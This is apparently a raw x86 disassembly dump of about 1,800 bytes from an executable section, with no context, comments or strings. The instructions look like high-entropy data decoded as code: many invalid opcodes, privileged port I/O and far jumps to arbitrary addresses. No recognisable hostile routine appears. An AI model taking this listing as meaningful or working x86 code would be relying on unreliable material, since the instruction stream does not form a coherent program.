  40b99c:	test   al,0xd8
  40b99e:	jo     0x40b9fc
  40b9a0:	(bad)  
  40b9a1:	aaa    
  40b9a2:	ja     0x40b97b
  40b9a4:	sahf   
  40b9a5:	enter  0xc751,0xf9
  40b9a9:	js     0x40b9ca
  40b9ab:	(bad)  
  40b9ac:	icebp  
  40b9ad:	outs   dx,DWORD PTR ds:[esi]
  40b9ae:	mov    edx,DWORD PTR [ebp+0x46097dd0]
  40b9b4:	scas   eax,DWORD PTR es:[edi]
  40b9b5:	js     0x40b9c5
  40b9b7:	imul   ebp,DWORD PTR [esp+eax*4+0x4fcb7438],0xf7de11a5
  40b9c2:	mov    al,BYTE PTR [edi]
  40b9c4:	xor    ecx,DWORD PTR [esi-0x42]
  40b9c7:	or     bl,bl
  40b9c9:	cs icebp 
  40b9cb:	gs mov ah,0x69
  40b9ce:	loop   0x40b9a0
  40b9d0:	dec    edi
  40b9d1:	sar    DWORD PTR [ecx+ecx*1+0xcf11e5f],cl
  40b9d8:	(bad)  
  40b9d9:	arpl   WORD PTR [edx],sp
  40b9db:	mov    dl,0x27
  40b9dd:	adc    BYTE PTR [esi+0x3ae53a9a],bh
  40b9e3:	scas   al,BYTE PTR es:[edi]
  40b9e4:	inc    edx
  40b9e5:	cwde   
  40b9e6:	add    ebx,DWORD PTR [esi+0x32f4f582]
  40b9ec:	jbe    0x40ba18
  40b9ee:	xchg   edi,eax
  40b9ef:	jns    0x40ba1a
  40b9f1:	dec    edi
  40b9f2:	mov    ch,0x11
  40b9f4:	aaa    
  40b9f5:	(bad)  
  40b9f7:	outs   dx,BYTE PTR ds:[esi]
  40b9f8:	dec    ecx
  40b9f9:	sti    
  40b9fa:	fcom   DWORD PTR [edi+0x3a1dca9e]
  40ba00:	(bad)  
  40ba01:	dec    eax
  40ba02:	sar    DWORD PTR [edx],0x75
  40ba05:	sbb    al,0x4d
  40ba07:	sbb    edi,ecx
  40ba09:	test   BYTE PTR [bx+di+0x34a9],0x6a
  40ba0f:	shr    edx,cl
  40ba11:	les    edx,FWORD PTR [ebx+0x2be2ec3c]
  40ba17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba18:	popa   
  40ba19:	js     0x40b9c9
  40ba1b:	icebp  
  40ba1c:	loopne 0x40b9ab
  40ba1e:	sahf   
  40ba1f:	or     DWORD PTR [eax+0x7abda1],edx
  40ba25:	ss stc 
  40ba27:	out    dx,eax
  40ba28:	sub    ebx,DWORD PTR [edx-0x58dfadd3]
  40ba2e:	and    DWORD PTR [edi-0x6b12f34f],esp
  40ba34:	fwait
  40ba35:	shl    DWORD PTR [edi+0x492e922b],0xbd
  40ba3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba3d:	sub    dh,BYTE PTR [edx]
  40ba3f:	int    0x28
  40ba41:	gs sub dh,0x37
  40ba45:	mov    edx,0x192433bd
  40ba4a:	push   esi
  40ba4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba4c:	loop   0x40ba0a
  40ba4e:	lods   eax,DWORD PTR ds:[esi]
  40ba50:	sbb    bh,BYTE PTR [edi+0x3e]
  40ba53:	pushf  
  40ba54:	ja     0x40ba66
  40ba56:	mov    edx,DWORD PTR [esi-0x2f2d6463]
  40ba5c:	in     al,dx
  40ba5d:	cs std 
  40ba5f:	prefetch BYTE PTR [edx+0x1]
  40ba63:	bound  eax,QWORD PTR [ebp-0x53820e02]
  40ba69:	mov    WORD PTR [ecx+edx*1],fs
  40ba6c:	add    BYTE PTR [edx-0x5c],ah
  40ba6f:	jns    0x40bacc
  40ba71:	cwde   
  40ba72:	or     BYTE PTR [ecx+0x26],bl
  40ba75:	jns    0x40baeb
  40ba77:	sbb    ebx,esi
  40ba79:	pop    eax
  40ba7a:	dec    ebp
  40ba7b:	(bad)  
  40ba7c:	mov    ch,0xae
  40ba7e:	or     BYTE PTR [ecx],cl
  40ba80:	shl    ebx,0x95
  40ba83:	das    
  40ba84:	ja     0x40baf0
  40ba86:	xchg   DWORD PTR [esi-0x48cc712f],ebx
  40ba8c:	adc    dh,dh
  40ba8e:	sbb    cl,bh
  40ba90:	ror    DWORD PTR [edi-0x23],cl
  40ba93:	jle    0x40ba47
  40ba95:	push   0x998cdb57
  40ba9a:	cli    
  40ba9b:	sti    
  40ba9c:	lds    esi,FWORD PTR [esi-0x69]
  40ba9f:	int    0xe9
  40baa1:	jp     0x40bb03
  40baa3:	cwde   
  40baa4:	mov    ds:0x39e9c492,eax
  40baa9:	aas    
  40baaa:	(bad)  
  40baab:	jg     0x40ba44
  40baad:	mov    dl,BYTE PTR [eax+edi*1+0x64d86279]
  40bab4:	into   
  40bab5:	mov    esp,DWORD PTR [edi-0x8]
  40bab8:	mov    bh,0x14
  40baba:	and    dh,al
  40babc:	call   0xac1e:0xec81b82
  40bac3:	repz jmp 0x5c91:0x6d07a202
  40bacb:	iret   
  40bacc:	bound  eax,QWORD PTR [esi+0x5e]
  40bacf:	ret    0xb996
  40bad2:	mov    DWORD PTR [eax],esp
  40bad4:	lea    esp,ds:[ebx]
  40bad7:	cld    
  40bad8:	lock ds inc esp
  40badb:	mov    ebp,DWORD PTR [eax-0x60ef44c7]
  40bae1:	push   ds
  40bae2:	sub    al,0xdb
  40bae4:	lods   al,BYTE PTR ds:[esi]
  40bae5:	int    0x3f
  40bae7:	mov    bh,0x77
  40bae9:	xor    ebp,esi
  40baeb:	jns    0x40bb2c
  40baed:	add    cl,dh
  40baef:	mov    dl,0xd4
  40baf1:	scas   al,BYTE PTR es:[edi]
  40baf2:	pop    ebp
  40baf3:	retf   0x8478
  40baf6:	pop    esi
  40baf7:	add    eax,DWORD PTR [edi+0x53]
  40bafa:	popa   
  40bafb:	stos   BYTE PTR es:[edi],al
  40bafc:	mov    cl,BYTE PTR [eax]
  40bafe:	mov    bl,0x49
  40bb00:	sub    DWORD PTR [esi-0x2bdd3fe1],edx
  40bb06:	scas   al,BYTE PTR es:[edi]
  40bb07:	stc    
  40bb08:	imul   ecx,ebx,0x26
  40bb0b:	das    
  40bb0c:	xchg   BYTE PTR [eax+0x5ca85efa],dh
  40bb12:	fld    QWORD PTR [edx+0x32]
  40bb15:	inc    eax
  40bb16:	ror    DWORD PTR [edi],0xd9
  40bb19:	and    al,0x7c
  40bb1b:	pop    edx
  40bb1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb1d:	sub    BYTE PTR [esi-0x7a373054],ch
  40bb23:	in     al,dx
  40bb24:	fcmovnbe st,st(5)
  40bb26:	mov    ?,WORD PTR [ebx-0x23]
  40bb29:	fbstp  TBYTE PTR [edi-0x7b]
  40bb2c:	sub    dl,BYTE PTR [edx+0x76]
  40bb2f:	loop   0x40bb7d
  40bb31:	cmp    DWORD PTR [esi+0x3f],edi
  40bb34:	adc    al,0x5f
  40bb36:	dec    edi
  40bb37:	clc    
  40bb38:	(bad)  [edi]
  40bb3a:	(bad)  
  40bb3b:	mov    al,0x41
  40bb3d:	fisub  WORD PTR [edi]
  40bb3f:	int3   
  40bb40:	shl    DWORD PTR [esp+ecx*8+0x1b68427],1
  40bb47:	mov    bl,0x9e
  40bb49:	push   esp
  40bb4a:	push   0xff788f65
  40bb4f:	xchg   BYTE PTR [ebx-0x41],bl
  40bb52:	test   edx,eax
  40bb54:	mov    BYTE PTR [esi+esi*2+0x1],bh
  40bb58:	(bad)  
  40bb59:	div    BYTE PTR [edi+0x42]
  40bb5c:	push   eax
  40bb5d:	sbb    al,0x20
  40bb5f:	jg     0x40bb7b
  40bb61:	pop    esi
  40bb62:	xchg   ebx,eax
  40bb63:	mov    esp,0xe03a6f6f
  40bb68:	xor    eax,0x1b485f31
  40bb6d:	in     al,dx
  40bb6e:	and    eax,0xc38dc1aa
  40bb73:	and    al,0x98
  40bb75:	pusha  
  40bb76:	sub    ebp,DWORD PTR [ebp-0x724bbac]
  40bb7c:	popf   
  40bb7d:	xchg   esp,eax
  40bb7e:	int3   
  40bb7f:	xchg   bh,al
  40bb81:	in     eax,dx
  40bb82:	test   al,0xd5
  40bb84:	and    edx,DWORD PTR ds:0xfb8720ac
  40bb8a:	mov    cl,0x81
  40bb8c:	xor    eax,0x9237049b
  40bb91:	ss (bad) 
  40bb93:	jbe    0x40bba1
  40bb95:	call   0x6868:0xe4da75f3
  40bb9c:	fwait
  40bb9d:	aas    
  40bb9e:	dec    edx
  40bb9f:	hlt    
  40bba0:	add    DWORD PTR [ebx+0x7],ecx
  40bba3:	push   0x71e1bb77
  40bba8:	mov    al,0x24
  40bbaa:	enter  0xa423,0x1c
  40bbae:	sbb    al,0x64
  40bbb0:	out    dx,al
  40bbb1:	inc    ecx
  40bbb2:	mov    bh,0x26
  40bbb4:	cli    
  40bbb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbb6:	adc    DWORD PTR [ebx+0x56],0xf5a7daaa
  40bbbd:	ret    
  40bbbe:	test   BYTE PTR [ecx-0x57],al
  40bbc1:	xor    dl,ch
  40bbc3:	ja     0x40bb7e
  40bbc5:	xchg   edi,eax
  40bbc6:	inc    DWORD PTR [edi]
  40bbc8:	dec    ebp
  40bbc9:	pop    eax
  40bbca:	sbb    eax,0xe19013da
  40bbcf:	and    ch,al
  40bbd1:	daa    
  40bbd2:	xor    al,ch
  40bbd4:	(bad)  
  40bbd5:	(bad)  
  40bbd7:	dec    edi
  40bbd8:	add    al,0x7f
  40bbda:	xor    esi,edx
  40bbdc:	fadd   QWORD PTR [esi+0x167968bc]
  40bbe2:	out    0xc8,al
  40bbe4:	mov    esp,0xc98d81bc
  40bbe9:	mov    BYTE PTR [edi-0x2fc1ef66],bl
  40bbef:	fcomp  QWORD PTR [esp+edi*2+0x765bbe4a]
  40bbf6:	push   edi
  40bbf7:	adc    bl,cl
  40bbf9:	imul   esp,esp,0xd51cfef
  40bbff:	fild   WORD PTR [eax-0x5a]
  40bc02:	loop   0x40bbeb
  40bc04:	ins    DWORD PTR es:[edi],dx
  40bc05:	mov    esi,0x39ebbf64
  40bc0a:	and    al,BYTE PTR [esi-0x10ce5c2b]
  40bc10:	js     0x40bc08
  40bc12:	loop   0x40bc7f
  40bc14:	outs   dx,DWORD PTR ds:[esi]
  40bc15:	cmc    
  40bc16:	lods   al,BYTE PTR ds:[esi]
  40bc17:	shl    DWORD PTR [edi],cl
  40bc19:	nop
  40bc1a:	jmp    0xbb92:0x6b1e3df9
  40bc21:	xor    bl,BYTE PTR [edx-0x374b7f0a]
  40bc27:	sbb    eax,0xffb0ea1a
  40bc2c:	push   es
  40bc2d:	push   ecx
  40bc2e:	push   esp
  40bc2f:	xchg   BYTE PTR [eax+0x27e6bfd4],dh
  40bc35:	mov    dh,BYTE PTR [eax-0x18]
  40bc38:	xlat   BYTE PTR ds:[ebx]
  40bc39:	cld    
  40bc3a:	sub    ecx,DWORD PTR [esi]
  40bc3c:	jp     0x40bc2d
  40bc3e:	(bad)  [ecx+0x34]
  40bc41:	xchg   ecx,eax
  40bc43:	jp     0x40bc23
  40bc45:	sub    al,0x86
  40bc47:	scas   al,BYTE PTR es:[edi]
  40bc48:	push   ebx
  40bc49:	add    al,0x22
  40bc4b:	jmp    0xac8a56d
  40bc50:	add    eax,0x3384a985
  40bc55:	ds or  al,0x58
  40bc58:	push   ebp
  40bc59:	inc    esp
  40bc5a:	stos   BYTE PTR es:[edi],al
  40bc5b:	or     ebp,DWORD PTR [esp+ebp*4-0x6]
  40bc5f:	int3   
  40bc60:	(bad)  
  40bc61:	jo     0x40bc9b
  40bc63:	cmp    BYTE PTR [ebx+0xc85cf41],al
  40bc69:	xchg   esi,eax
  40bc6a:	(bad)  
  40bc6c:	xor    al,0x8d
  40bc6e:	sbb    edx,DWORD PTR [ebx]
  40bc70:	gs pop ds
  40bc72:	test   eax,0xd162217f
  40bc77:	push   edx
  40bc78:	xor    BYTE PTR [edx],0x62
  40bc7b:	and    al,0x1b
  40bc7d:	or     esp,DWORD PTR [edi]
  40bc7f:	imul   eax,DWORD PTR ds:0x6f208e91,0x25ac7a6a
  40bc89:	std    
  40bc8a:	ret    
  40bc8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc8c:	stos   BYTE PTR es:[edi],al
  40bc8d:	mov    dh,0xe6
  40bc8f:	sbb    ebx,DWORD PTR [esp+ecx*8+0x8655bba]
  40bc96:	retf   0x11fe
  40bc99:	inc    ebx
  40bc9a:	test   eax,0x7d8d874e
  40bc9f:	adc    BYTE PTR [edx-0x3a],al
  40bca2:	pop    eax
  40bca3:	sbb    edi,DWORD PTR [ebx]
  40bca5:	dec    edi
  40bca6:	in     al,0xf8
  40bca8:	sub    edi,DWORD PTR [edi]
  40bcaa:	and    bl,BYTE PTR [ebx+0x58d8cfab]
  40bcb0:	jge    0x40bc38
  40bcb2:	xchg   BYTE PTR [ebp-0x2ec56c9e],bh
  40bcb8:	dec    ebx
  40bcb9:	xchg   esi,eax
  40bcba:	lds    eax,FWORD PTR [ebp+0xe46e757]
  40bcc0:	dec    ecx
  40bcc1:	cmp    eax,0x63cb6027
  40bcc6:	push   ebx
  40bcc7:	mov    BYTE PTR [ebx-0x2ac06964],0x31
  40bcce:	test   BYTE PTR [esi],bh
  40bcd0:	adc    al,BYTE PTR [eax-0x20]
  40bcd3:	loope  0x40bd2a
  40bcd5:	pop    eax
  40bcd6:	div    BYTE PTR [ebx]
  40bcd8:	cdq    
  40bcd9:	stc    
  40bcda:	outs   dx,BYTE PTR ds:[esi]
  40bcdb:	pusha  
  40bcdc:	push   eax
  40bcdd:	ds sbb al,0x4
  40bce0:	loope  0x40bca6
  40bce2:	jmp    0x40bcda
  40bce4:	or     bh,BYTE PTR ds:0x74bc0f3a
  40bcea:	mov    ebp,0x610268e7
  40bcef:	(bad)  
  40bcf0:	repz pop eax
  40bcf2:	xor    eax,0xd6414d59
  40bcf7:	push   ebx
  40bcf8:	sub    bl,dl
  40bcfa:	jo     0x40bd0f
  40bcfc:	fdiv   st,st(3)
  40bcfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcff:	call   0xd02152d4
  40bd04:	cmp    al,0xe6
  40bd06:	add    ebx,ecx
  40bd08:	dec    edx
  40bd09:	aas    
  40bd0a:	js     0x40bd32
  40bd0c:	jl     0x40bd8a
  40bd0e:	cli    
  40bd0f:	loopne 0x40bccb
  40bd11:	dec    edi
  40bd12:	repz gs lahf 
  40bd15:	jbe    0x40bce0
  40bd17:	push   ss
  40bd18:	jle    0x40bd14
  40bd1a:	rcr    BYTE PTR [eax],0xde
  40bd1d:	(bad)  [esi+0x50]
  40bd20:	cmc    
  40bd21:	or     eax,0x4c94f264
  40bd26:	pop    gs
  40bd28:	test   al,0xff
  40bd2a:	mov    bh,0xd4
  40bd2c:	shl    BYTE PTR [ebx],cl
  40bd2e:	mov    eax,ds:0x73c7ce
  40bd33:	ss gs push edi
  40bd36:	ds mov esp,0xd4380b69
  40bd3c:	pop    eax
  40bd3d:	push   ebx
  40bd3e:	shl    BYTE PTR [ebx-0x75a838fb],cl
  40bd44:	retf   
  40bd45:	cld    
  40bd46:	(bad)  
  40bd47:	jns    0x40bccb
  40bd49:	and    esp,DWORD PTR ds:0xf77892e
  40bd4f:	fsubr  st(2),st
  40bd51:	imul   esp,esp,0x57
  40bd54:	xor    eax,0x974f91cb
  40bd59:	dec    ecx
  40bd5a:	jo     0x40bd30
  40bd5c:	jae    0x40bcfe
  40bd5e:	addr16 fs cmp bl,ah
  40bd62:	int3   
  40bd63:	inc    ebp
  40bd64:	xchg   ebp,eax
  40bd65:	cwde   
  40bd66:	jns    0x40bd40
  40bd68:	add    edi,eax
  40bd6a:	add    BYTE PTR [edx+0x4b],cl
  40bd6d:	push   esi
  40bd6e:	into   
  40bd6f:	jecxz  0x40bdd3
  40bd71:	bound  eax,QWORD PTR [ecx+0x75]
  40bd74:	std    
  40bd75:	ror    DWORD PTR [esi-0xb],1
  40bd78:	jne    0x40bd9c
  40bd7a:	mov    ebx,0xa66671c4
  40bd7f:	mov    esp,0xc793b61f
  40bd84:	dec    esi
  40bd85:	mov    edi,0x7ae4c94
  40bd8a:	fcmovb st,st(0)
  40bd8c:	fistp  WORD PTR [eax+ecx*4]
  40bd8f:	outs   dx,BYTE PTR ds:[esi]
  40bd90:	pop    esp
  40bd91:	scas   al,BYTE PTR es:[edi]
  40bd92:	das    
  40bd93:	mov    eax,ds:0x255d8908
  40bd98:	in     al,dx
  40bd99:	fdivr  st,st(2)
  40bd9b:	sub    BYTE PTR [esi-0x3a],bl
  40bd9e:	hlt    
  40bd9f:	push   ds
  40bda0:	xor    BYTE PTR [eax-0x2f],al
  40bda3:	xchg   ebp,eax
  40bda4:	mov    ds:0xf90b47e9,al
  40bda9:	mov    DWORD PTR [eax+0x45],eax
  40bdac:	push   0xffffffaa
  40bdae:	aad    0xc0
  40bdb0:	das    
  40bdb1:	add    al,0xeb
  40bdb3:	int    0xb2
  40bdb5:	in     al,dx
  40bdb6:	push   ss
  40bdb7:	or     DWORD PTR [esi+0x28],ebx
  40bdba:	jmp    0x137de55e
  40bdbf:	cmp    BYTE PTR [esi+0x5d93213d],cl
  40bdc5:	mov    eax,0x4aaee2a6
  40bdca:	jle    0x40bd72
  40bdcc:	mov    ebx,0xf0b36fa8
  40bdd1:	inc    ebx
  40bdd2:	pop    esi
  40bdd3:	ret    0x69e5
  40bdd6:	(bad)  
  40bdd7:	jo     0x40be36
  40bdd9:	mov    dl,BYTE PTR [ebx+0x51]
  40bddc:	pop    es
  40bddd:	mov    ch,0x15
  40bddf:	lea    edi,[edx-0x55387620]
  40bde5:	push   ebx
  40bde6:	pop    eax
  40bde7:	mov    eax,0xf34cd8fa
  40bdec:	mov    ebx,0x99f2fe19
  40bdf1:	stc    
  40bdf2:	ss adc al,0x82
  40bdf5:	in     al,dx
  40bdf6:	call   DWORD PTR [eax]
  40bdf8:	stos   DWORD PTR es:[edi],eax
  40bdf9:	sti    
  40bdfa:	imul   DWORD PTR [ecx]
  40bdfc:	cmc    
  40bdfd:	cmp    eax,0xc30c76f
  40be02:	inc    ebx
  40be03:	sbb    DWORD PTR [ebp+0x4c],eax
  40be06:	push   eax
  40be07:	les    edx,FWORD PTR [esi]
  40be09:	adc    ch,0x1e
  40be0c:	mov    ds:0x19222682,al
  40be11:	cmc    
  40be12:	add    eax,0xd84d3dd1
  40be17:	fldenv [edx+0x4d3b3c2d]
  40be1d:	push   esi
  40be1e:	loope  0x40bdc9
  40be20:	lea    ecx,[edi+eax*2+0x30]
  40be24:	shr    BYTE PTR [esi],cl
  40be26:	mov    ds:0xbccdc9ab,eax
  40be2b:	loope  0x40be19
  40be2d:	fisub  WORD PTR [eax]
  40be2f:	outs   dx,BYTE PTR ds:[esi]
  40be30:	xor    al,0x4f
  40be32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be33:	adc    edx,DWORD PTR ds:0xe1889a78
  40be39:	push   cs
  40be3a:	ror    ecx,cl
  40be3c:	shr    DWORD PTR [edi],cl
  40be3e:	lods   eax,DWORD PTR ds:[esi]
  40be3f:	push   es
  40be40:	bound  ebx,QWORD PTR [ecx+0x1c]
  40be43:	adc    ah,ch
  40be45:	sub    eax,0x61172ef0
  40be4a:	lds    eax,FWORD PTR [edi]
  40be4c:	push   0xffffff99
  40be4e:	test   BYTE PTR cs:[eax+edx*2],ch
  40be52:	pusha  
  40be53:	popa   
  40be54:	dec    eax
  40be55:	xchg   esi,eax
  40be56:	sbb    eax,0x9024b439
  40be5b:	leave  
  40be5c:	or     eax,0x68ca1764
  40be61:	and    al,ch
  40be63:	mov    dl,BYTE PTR [edx]
  40be65:	inc    ebx
  40be66:	out    0x9f,al
  40be68:	inc    edi
  40be69:	leave  
  40be6a:	mov    eax,0x6e10d29
  40be6f:	push   cs
  40be70:	iret   
  40be71:	(bad)  
  40be72:	sub    esi,edi
  40be74:	inc    esp
  40be75:	jmp    0x40be19
  40be77:	scas   al,BYTE PTR es:[edi]
  40be78:	ss mov bh,0xfb
  40be7b:	jmp    0x4374:0x18a8c47e
  40be82:	in     eax,dx
  40be83:	sub    al,0x14
  40be85:	jmp    0xa809e357
  40be8a:	retf   
  40be8b:	mov    dl,0x7a
  40be8d:	push   es
  40be8e:	mov    BYTE PTR [eax+esi*4],cl
  40be91:	repz shl DWORD PTR [ecx+0x9],0x3d
  40be96:	dec    esp
  40be97:	inc    edx
  40be98:	scas   al,BYTE PTR es:[edi]
  40be99:	iret   
  40be9a:	jp     0x40be8d
  40be9c:	sub    eax,DWORD PTR [edx+eiz*4+0x1aeb3f38]
  40bea3:	mov    ds:0x3b8b0435,eax
  40bea8:	adc    al,0x35
  40beaa:	pop    edi
  40beab:	in     al,dx
  40beac:	sbb    DWORD PTR [ebx+0x52418fde],ecx
  40beb2:	(bad)  
  40beb3:	jne    0x40be8f
  40beb5:	mov    WORD PTR [edx],es
  40beb7:	sbb    edi,edx
  40beb9:	(bad)  
  40beba:	std    
  40bebb:	pop    ecx
  40bebc:	cmc    
  40bebd:	fwait
  40bebe:	sar    DWORD PTR [edx],1
  40bec0:	outs   dx,DWORD PTR ds:[esi]
  40bec1:	and    BYTE PTR [ecx-0x2c7a935c],ch
  40bec7:	repnz sbb edi,ebx
  40beca:	out    0x8c,al
  40becc:	adc    eax,0xcd95044
  40bed1:	cmp    eax,0x38a288cf
  40bed6:	(bad)  
  40bed7:	jle    0xf55cd9f8
  40bedd:	lahf   
  40bede:	clc    
  40bedf:	in     eax,dx
  40bee0:	adc    DWORD PTR [edx+eiz*2+0x33],esp
  40bee4:	jge    0x40bea1
  40bee6:	inc    esi
  40bee7:	or     dl,BYTE PTR [ecx]
  40bee9:	push   ebx
  40beea:	sub    edi,DWORD PTR [edi-0xc0be3ce]
  40bef0:	add    cl,BYTE PTR [ebp-0x281cf8be]
  40bef6:	sbb    eax,0x4e8f6996
  40befb:	mov    ss,WORD PTR ss:[edi+0xa0e5799]
  40bf02:	cmp    eax,0x4e8e3192
  40bf07:	popw   ds
  40bf09:	cs fcmovb st,st(0)
  40bf0c:	es push es
  40bf0e:	add    DWORD PTR [ecx],ebx
  40bf10:	je     0x40bf8c
  40bf12:	jle    0x40bf73
  40bf14:	pop    ss
  40bf15:	js     0x40bf05
  40bf17:	add    eax,0x33de6434
  40bf1c:	je     0x40bec7
  40bf1e:	jge    0x40bf44
  40bf20:	leave  
  40bf21:	inc    eax
  40bf22:	jbe    0x40bec1
  40bf24:	xor    dh,dl
  40bf26:	hlt    
  40bf27:	aam    0x28
  40bf29:	mov    cl,0x3a
  40bf2b:	(bad)  
  40bf2c:	jmp    0x40bf95
  40bf2e:	cmp    DWORD PTR [ebx-0x18],ebx
  40bf31:	addr16 xor bh,0x9a
  40bf35:	jecxz  0x40bf53
  40bf37:	(bad)  
  40bf39:	cmp    esi,esi
  40bf3b:	xchg   esp,eax
  40bf3c:	jle    0x40bfaf
  40bf3e:	jge    0x40bf72
  40bf40:	mov    WORD PTR [ecx-0x366a88e9],ds
  40bf46:	xchg   ecx,eax
  40bf47:	push   es
  40bf48:	outs   dx,BYTE PTR ds:[esi]
  40bf49:	inc    ecx
  40bf4a:	jae    0x40bf27
  40bf4c:	mov    bh,0x18
  40bf4e:	cmp    ch,BYTE PTR [esi+0x28]
  40bf51:	dec    ebp
  40bf52:	pop    ebx
  40bf53:	dec    ebx
  40bf54:	xchg   edi,eax
  40bf55:	mov    ebx,0x81a1e8b9
  40bf5a:	xor    eax,0x629f1208
  40bf5f:	cli    
  40bf60:	ds in  al,0x47
  40bf63:	fmul   st(6),st
  40bf65:	xchg   BYTE PTR [bp+di],cl
  40bf68:	jmp    0x79378738
  40bf6d:	repnz cmp ch,BYTE PTR [ebx+esi*1]
  40bf71:	rol    DWORD PTR [edi+0x650bedc1],cl
  40bf77:	jl     0x40bfb2
  40bf79:	xchg   DWORD PTR [eax+0x47d3c1ee],esp
  40bf7f:	fist   WORD PTR [esi+0x3e]
  40bf82:	mov    eax,ds:0xb2639f55
  40bf87:	xor    bh,BYTE PTR ds:0x2ef551b6
  40bf8d:	or     al,BYTE PTR [edi+0x11d426f1]
  40bf93:	in     eax,dx
  40bf94:	xlat   BYTE PTR ds:[ebx]
  40bf95:	aaa    
  40bf96:	ins    BYTE PTR es:[edi],dx
  40bf97:	clc    
  40bf98:	inc    esp
  40bf99:	dec    eax
  40bf9a:	jecxz  0x40bf5c
  40bf9c:	out    dx,al
  40bf9d:	in     eax,dx
  40bf9e:	push   edx
  40bf9f:	into   
  40bfa0:	in     eax,0x48
  40bfa2:	xor    edi,0x1f9458be
  40bfa8:	and    ebx,ecx
  40bfaa:	cmp    ch,dh
  40bfac:	jbe    0x40c028
  40bfae:	popa   
  40bfaf:	pushf  
  40bfb0:	iret   
  40bfb1:	sub    eax,0x22c036bd
  40bfb6:	xor    BYTE PTR [eax-0xa],bl
  40bfb9:	pop    edi
  40bfba:	add    al,0x44
  40bfbc:	icebp  
  40bfbd:	jl     0x40bfbe
  40bfbf:	ret    
  40bfc0:	jmp    0x40bf5d
  40bfc2:	xchg   ch,dh
  40bfc4:	sbb    eax,esp
  40bfc6:	xchg   ebp,eax
  40bfc7:	add    ebx,esp
  40bfc9:	and    DWORD PTR [esi],edi
  40bfcb:	test   al,0xa4
  40bfcd:	(bad)
  40bfd0:	sbb    eax,0xa198f81e
  40bfd5:	jno    0x40c00a
  40bfd7:	mov    ds:0x2b1caf96,eax
  40bfdc:	fcos   
  40bfde:	jae    0x40c026
  40bfe0:	or     BYTE PTR [eax-0x3d],0xda
  40bfe4:	es dec esp
  40bfe6:	(bad)  
  40bfe7:	cmp    DWORD PTR [esi],edx
  40bfe9:	dec    ecx
  40bfea:	mov    bh,0x19
  40bfec:	popf   
  40bfed:	mov    ebx,gs
  40bfef:	jns    0x40bfd4
  40bff1:	fs ret 
  40bff3:	shl    DWORD PTR [ecx+0x4c75df8f],cl
  40bff9:	fld    DWORD PTR [ecx-0x1d2fbd5c]
  40bfff:	(bad)  
  40c000:	fnstcw WORD PTR [ebx-0x58ca2d90]
  40c006:	ror    BYTE PTR [ebx-0x68b9426c],cl
  40c00c:	ja     0x40bfd4
  40c00e:	fisubr DWORD PTR [ebx+0x1e]
  40c011:	inc    ecx
  40c012:	pop    ebx
  40c013:	and    eax,0xd4e55ccd
  40c018:	rcr    BYTE PTR [ebp+0x15],cl
  40c01b:	int    0x1e
  40c01d:	pop    eax
  40c01e:	and    eax,0xf2001985
  40c023:	lods   eax,DWORD PTR ds:[esi]
  40c024:	daa    
  40c025:	(bad)  
  40c026:	cld    
  40c027:	sub    eax,0x8998a6f8
  40c02c:	inc    ebp
  40c02d:	inc    edx
  40c02e:	add    dl,dh
  40c030:	hlt    
  40c031:	mov    WORD PTR ds:0xd42b8114,es
  40c037:	daa    
  40c038:	jecxz  0x40bfdd
  40c03a:	test   eax,0xf6fbaf2c
  40c03f:	adc    DWORD PTR [ecx+0x48],esp
  40c042:	out    dx,al
  40c043:	cmp    bh,BYTE PTR [edi-0x3b]
  40c046:	repz or BYTE PTR [esi-0x38],ah
  40c04a:	bound  edx,QWORD PTR [eax-0x1b6b1b5f]
  40c050:	push   0xe9bb305a
  40c055:	(bad)  
  40c056:	jp     0x40c046
  40c058:	jmp    0x5af4:0x6abbeeca
  40c05f:	mov    eax,0xad53a582
  40c064:	adc    dh,BYTE PTR [esp+edx*2]
  40c067:	jmp    0xa2f3fbfe
  40c06c:	inc    ecx
  40c06d:	lea    ebp,[edx+edi*8]
  40c070:	jl     0x40c09f
  40c072:	push   edi
  40c073:	or     BYTE PTR [ebx-0x71],al
  40c076:	pop    ecx
  40c077:	cmp    BYTE PTR [edi+ebp*1-0x696163d6],al
  40c07e:	inc    eax
  40c07f:	cdq    
  40c080:	mov    al,ds:0xcd78d420
  40c085:	xlat   BYTE PTR ds:[ebx]
  40c086:	pop    ss
  40c087:	add    eax,0x41cc1c20
  40c08c:	retf   0x4860
  40c08f:	or     DWORD PTR [edx+0x1c43fabc],eax
  40c095:	mov    ebp,0x2ba49b54
  40c09a:	bound  edx,QWORD PTR [ebx]
  40c09c:	enter  0x7c25,0xcb
  40c0a0:	pop    edx
  40c0a1:	mov    esp,0x54a78b80
  40c0a6:	bound  ecx,QWORD PTR [esi]
  40c0a8:	jge    0x40c0a5
  40c0aa:	shr    eax,1
  40c0ac:	test   DWORD PTR ds:0x6bf03d90,esp
  40c0b2:	in     al,dx
  40c0b3:	lock and eax,0x395a9684
  40c0b9:	in     al,dx
  40c0ba:	pop    esp
  40c0bb:	cmp    al,0x26
  40c0bd:	les    ecx,FWORD PTR [esi]
  40c0bf:	inc    edx
  40c0c0:	addr16 rcl cl,cl
  40c0c3:	sbb    cl,ah
  40c0c5:	cmp    ebp,DWORD PTR [ebx-0x8]
  40c0c8:	inc    eax
  40c0c9:	jecxz  0x40c087
  40c0cb:	stc    
  40c0cc:	out    dx,al
  40c0cd:	loopne 0x40c07b
  40c0cf:	push   ecx
  40c0d0:	in     al,0x96
  40c0d2:	test   al,0xd0
  40c0d4:	xchg   edi,eax
  40c0d5:	sub    bl,ah
  40c0d7:	sub    dl,BYTE PTR gs:[esi]
  40c0da:	pop    esi
  40c0db:	inc    ecx
  40c0dc:	jmp    0x40c0f0
  40c0de:	stc    
  40c0df:	les    esp,FWORD PTR [edx+ebp*4]
  40c0e2:	xor    al,0x67
  40c0e4:	or     BYTE PTR [edx],cl
  40c0e6:	and    esp,DWORD PTR [edi]
  40c0e8:	(bad)  
  40c0e9:	repnz fild WORD PTR [edi-0x20c5da4d]
  40c0f0:	sbb    BYTE PTR [edi+0xf1c9737],al
  40c0f6:	fadd   DWORD PTR [edi-0x20]
  40c0f9:	push   es
